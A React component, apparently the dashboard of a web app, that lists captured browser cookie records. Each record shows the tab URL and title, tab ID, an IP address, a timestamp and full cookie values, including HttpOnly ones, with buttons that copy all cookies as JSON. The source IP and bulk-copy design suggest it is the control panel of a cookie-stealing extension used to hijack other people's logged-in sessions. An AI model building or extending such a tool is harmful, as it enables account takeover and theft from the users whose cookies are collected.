import React, { useState } from "react";
import { Cookie } from "@/db/schema";
import AlertDialog from "./AlertDialog";
import Image from "next/image";

type CookieEntryProps = {
  id: number;
  url: string;
  tabId: number;
  tabTitle: string | null;
  favIconUrl: string | null;
  cookiesData: Cookie[];
  ipAddress: string | null;
  createdAt: string;
};

type CookieTableProps = {
  entries: CookieEntryProps[];
  isLoading: boolean;
  refreshCookies: () => void;
  onEntryDeleted: (id: number) => void;
};

export default function CookieTable({
  entries,
  isLoading,
  onEntryDeleted,
}: CookieTableProps) {
  const [expandedRow, setExpandedRow] = useState<number | null>(null);
  const [alertState, setAlertState] = useState({
    isOpen: false,
    title: "",
    message: "",
    confirmText: "",
    cancelText: "",
    onConfirm: () => {},
    type: "info" as "info" | "delete" | "success",
  });
  const [deleteId, setDeleteId] = useState<number | null>(null);
  const [isDeleting, setIsDeleting] = useState(false);

  // Function to toggle row expansion
  const toggleRow = (id: number) => {
    if (expandedRow === id) {
      setExpandedRow(null);
    } else {
      setExpandedRow(id);
    }
  };

  // Function to copy cookies as JSON - no dialog shown
  const copyCookies = (cookies: Cookie[]) => {
    navigator.clipboard.writeText(JSON.stringify(cookies, null, 2));
    // No alert dialog, just copy silently
  };

  // Function to confirm deletion
  const confirmDelete = (id: number) => {
    setDeleteId(id);
    setAlertState({
      isOpen: true,
      title: "Delete this message?",
      message:
        "This action cannot be undone. This will permanently delete this message from your account.",
      confirmText: "Delete",
      cancelText: "Cancel",
      onConfirm: () => handleDelete(id),
      type: "delete",
    });
  };

  async function handleDelete(id: number) {
    // Set a flag to prevent multiple delete operations
    if (isDeleting) return;

    setIsDeleting(true);
    console.log(`Deleting entry with id: ${id}`);

    try {
      // First close the alert dialog
      setAlertState((prev) => ({ ...prev, isOpen: false }));

      const response = await fetch(`/api/cookies/${id}`, {
        method: "DELETE",
      });

      if (response.ok) {
        console.log(`Entry with id ${id} deleted successfully`);

        // Update state to reflect the deletion
        onEntryDeleted(id);
      } else {
        console.error(`Failed to delete entry with id ${id}`);
        setAlertState({
          isOpen: true,
          title: "Error",
          message: "Failed to delete entry.",
          confirmText: "OK",
          cancelText: "",
          onConfirm: () =>
            setAlertState((prev) => ({ ...prev, isOpen: false })),
          type: "info",
        });
      }
    } catch (error) {
      console.error("Error deleting entry:", error);
      setAlertState({
        isOpen: true,
        title: "Error",
        message: "Error deleting entry.",
        confirmText: "OK",
        cancelText: "",
        onConfirm: () => setAlertState((prev) => ({ ...prev, isOpen: false })),
        type: "info",
      });
    } finally {
      setIsDeleting(false);
    }
  }

  if (isLoading) {
    return (
      <div className="w-full p-8 flex justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
      </div>
    );
  }

  if (entries.length === 0) {
    return (
      <div className="w-full p-8 text-center">
        <p className="text-gray-400">No cookie data found.</p>
      </div>
    );
  }

  return (
    <div className="w-full overflow-x-auto">
      <AlertDialog
        isOpen={alertState.isOpen}
        title={alertState.title}
        message={alertState.message}
        confirmText={alertState.confirmText}
        cancelText={alertState.cancelText}
        onConfirm={alertState.onConfirm}
        onCancel={() => setAlertState((prev) => ({ ...prev, isOpen: false }))}
        type={alertState.type}
      />

      <table className="w-full table-auto border-collapse">
        <thead>
          <tr className="bg-gray-800 text-left">
            <th className="p-4 text-gray-300">Tab URL</th>
            <th className="p-4 text-gray-300">Tab ID</th>
            <th className="p-4 text-gray-300">IP Address</th>
            <th className="p-4 text-gray-300">Tab Title</th>
            <th className="p-4 text-gray-300">Cookies</th>
            <th className="p-4 text-gray-300">Timestamp</th>
            <th className="p-4 text-gray-300">Actions</th>
          </tr>
        </thead>
        <tbody>
          {entries.map((entry) => (
            <React.Fragment key={entry.id}>
              <tr
                className="border-b border-gray-700 hover:bg-gray-800 cursor-pointer"
                onClick={() => toggleRow(entry.id)}
              >
                <td className="p-4 flex items-center">
                  {entry.favIconUrl && (
                    <Image
                      width={16}
                      height={16}
                      src={entry.favIconUrl}
                      alt="Favicon"
                      className="w-4 h-4 mr-2"
                      onError={(e) => (e.currentTarget.style.display = "none")}
                    />
                  )}
                  <span className="truncate max-w-xs">{entry.url}</span>
                </td>
                <td className="p-4">{entry.tabId}</td>
                <td className="p-4">{entry.ipAddress}</td>
                <td className="p-4 truncate max-w-xs">{entry.tabTitle}</td>
                <td className="p-4">{entry.cookiesData.length} cookies</td>
                <td className="p-4">
                  {new Date(entry.createdAt).toLocaleString()}
                </td>
                <td className="p-4">
                  <button
                    onClick={(e) => {
                      e.stopPropagation();
                      copyCookies(entry.cookiesData);
                    }}
                    className="bg-blue-600 hover:bg-blue-700 text-white py-1 px-3 rounded text-sm"
                  >
                    Copy
                  </button>
                  <button
                    onClick={(e) => {
                      e.stopPropagation();
                      confirmDelete(entry.id);
                    }}
                    className="bg-red-600 hover:bg-red-700 text-white py-1 px-3 rounded text-sm ml-2"
                    disabled={isDeleting}
                  >
                    {isDeleting && deleteId === entry.id
                      ? "Deleting..."
                      : "Delete"}
                  </button>
                </td>
              </tr>
              {expandedRow === entry.id && (
                <tr className="bg-gray-900">
                  <td colSpan={6} className="p-4">
                    <div className="bg-gray-800 p-4 rounded-lg shadow-inner">
                      <h3 className="text-lg font-semibold mb-2 text-gray-300">
                        Cookie Details
                      </h3>
                      <div className="max-h-96 overflow-y-auto">
                        <table className="w-full">
                          <thead>
                            <tr className="bg-gray-700 text-left">
                              <th className="p-2 text-gray-300">Name</th>
                              <th className="p-2 text-gray-300">Value</th>
                              <th className="p-2 text-gray-300">Domain</th>
                              <th className="p-2 text-gray-300">Path</th>
                              <th className="p-2 text-gray-300">Expires</th>
                              <th className="p-2 text-gray-300">HttpOnly</th>
                              <th className="p-2 text-gray-300">Secure</th>
                            </tr>
                          </thead>
                          <tbody>
                            {entry.cookiesData.map((cookie, idx) => (
                              <tr
                                key={`${cookie.name}-${idx}`}
                                className="border-b border-gray-700 hover:bg-gray-700"
                              >
                                <td className="p-2 font-mono text-sm">
                                  {cookie.name}
                                </td>
                                <td className="p-2 font-mono text-sm truncate max-w-xs">
                                  {cookie.value}
                                </td>
                                <td className="p-2 font-mono text-sm">
                                  {cookie.domain}
                                </td>
                                <td className="p-2 font-mono text-sm">
                                  {cookie.path}
                                </td>
                                <td className="p-2 font-mono text-sm">
                                  {cookie.expirationDate
                                    ? new Date(
                                        cookie.expirationDate * 1000
                                      ).toLocaleString()
                                    : "Session"}
                                </td>
                                <td className="p-2 font-mono text-sm">
                                  {cookie.httpOnly ? "Yes" : "No"}
                                </td>
                                <td className="p-2 font-mono text-sm">
                                  {cookie.secure ? "Yes" : "No"}
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </table>
                      </div>
                      <div className="mt-4 flex justify-end">
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            copyCookies(entry.cookiesData);
                          }}
                          className="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded"
                        >
                          Copy All Cookies
                        </button>
                      </div>
                    </div>
                  </td>
                </tr>
              )}
            </React.Fragment>
          ))}
        </tbody>
      </table>
    </div>
  );
}
